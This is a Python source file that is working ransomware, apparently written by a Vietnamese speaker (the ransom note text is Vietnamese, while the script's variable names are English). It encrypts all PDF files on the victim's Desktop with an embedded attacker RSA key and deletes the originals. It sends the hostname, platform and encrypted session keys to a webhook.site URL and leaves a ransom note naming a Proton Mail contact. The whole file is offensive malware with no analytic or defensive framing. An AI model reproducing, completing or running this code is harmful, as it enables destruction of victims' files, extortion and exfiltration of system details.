import os
import sys
import struct
import traceback
import requests
import platform
import socket
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization

# --- Embedded Attacker's Public Key ---
ATTACKER_PUBLIC_KEY_PEM = """
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwgdy9Q5dsBrVso8AA10j
UOFZ12xhRtIk0h07id53fDQmNl8jV6tCBUnr0g1pyT3KH4qJDrT/sC2DWCbp5adH
Ylav2DuwZePXJb+Ai7XBakPnc/8001nNlgt1sW/JqNrf9/H1wyK0VcCJrpVttF2a
H4cB6bGM8SoUb5Em+91kZg7VOGxA3U8eZ9BoljB5TYj5m1xN4YQPwsyIOkYIuwMY
2GJ/ybKcc68hWzQEowxodQeGQXtx/8T0x1kHq7fRfz72wJlSMmylptJKu1L/ohi9
FXCtugig2uLi60PVf/iUYcfJ6hEsAcpwkzopATQ3Ip5wbJZI5XgKZdr6QRQ/mydn
+QIDAQAB
-----END PUBLIC KEY-----
"""

# --- Configuration ---
TARGET_EXTENSION = ".pdf"
ENCRYPTED_EXTENSION = ".SAVED"
RANSOM_NOTE_FILENAME = "!!! READ ME TO RECOVER FILES !!!.txt"
WEBHOOK_URL = "	https://webhook.site/48186506-5b0c-4bcb-b0a3-e04dba0f4502" 

# --- Helper functions ---

def load_embedded_public_key():
    try:
        return serialization.load_pem_public_key(
            ATTACKER_PUBLIC_KEY_PEM.encode('utf-8')
        )
    except Exception:
        sys.exit(1)

def send_to_webhook(file_name, encrypted_session_key):
    try:
        info = {
            "hostname": socket.gethostname(),
            "platform": platform.platform(),
            "time": datetime.now().isoformat(),
            "file_name": file_name,
            "encrypted_session_key": encrypted_session_key.hex()
        }
        requests.post(WEBHOOK_URL, json=info, timeout=5)
    except Exception:
        pass  # Im lặng nếu lỗi gửi

def hybrid_encrypt_single_file(file_path, public_key):
    encrypted_output_path = file_path + ENCRYPTED_EXTENSION

    if os.path.exists(encrypted_output_path) or file_path.lower().endswith(ENCRYPTED_EXTENSION.lower()):
        return None

    try:
        session_key = Fernet.generate_key()
        f = Fernet(session_key)

        encrypted_session_key = public_key.encrypt(
            session_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        with open(file_path, "rb") as file:
            original_data = file.read()

        encrypted_data = f.encrypt(original_data)

        with open(encrypted_output_path, "wb") as out_file:
            out_file.write(struct.pack('>I', len(encrypted_session_key)))
            out_file.write(encrypted_session_key)
            out_file.write(encrypted_data)

        os.remove(file_path)

        # Gửi thông tin qua webhook
        send_to_webhook(os.path.basename(file_path), encrypted_session_key)

        return encrypted_output_path

    except Exception:
        if 'encrypted_output_path' in locals() and os.path.exists(encrypted_output_path):
            try:
                os.remove(encrypted_output_path)
            except:
                pass
        return None

def create_ransom_note(directory):
    note_path = os.path.join(directory, RANSOM_NOTE_FILENAME)
    note_content = f"""
!!! TẤT CẢ CÁC TỆP QUAN TRỌNG CỦA BẠN ĐÃ BỊ MÃ HÓA !!!

Đừng lo lắng, bạn có thể khôi phục chúng!
Tệp {TARGET_EXTENSION} đã bị mã hóa 

!!! CẢNH BÁO !!!
- Đừng đổi tên hoặc chỉnh sửa các file.
- Đừng tự ý giải mã, bạn có thể làm mất dữ liệu vĩnh viễn.

Liên hệ qua testbaomat@proton.me
Nhanh chóng hành động!
"""

    if not os.path.exists(note_path):
        try:
            with open(note_path, "w", encoding="utf-8") as note_file:
                note_file.write(note_content)
        except IOError:
            pass

def encrypt_target_files(public_key):
    encrypted_count = 0
    error_count = 0

    if 'USERPROFILE' in os.environ:
        desktop_path = os.path.join(os.environ['USERPROFILE'], 'Desktop')
    elif 'HOME' in os.environ:
        desktop_path = os.path.join(os.environ['HOME'], 'Desktop')
    else:
        desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')

    if not os.path.isdir(desktop_path):
        return

    for item in os.listdir(desktop_path):
        item_path = os.path.join(desktop_path, item)
        if os.path.isfile(item_path) and item_path.lower().endswith(TARGET_EXTENSION):
            result = hybrid_encrypt_single_file(item_path, public_key)
            if result:
                encrypted_count += 1
            else:
                error_count += 1

    if encrypted_count > 0:
        create_ransom_note(desktop_path)

# --- Script Start ---
if __name__ == "__main__":
    attacker_public_key = load_embedded_public_key()

    if attacker_public_key:
        encrypt_target_files(attacker_public_key)
        sys.exit(0)
    else:
        sys.exit(1)
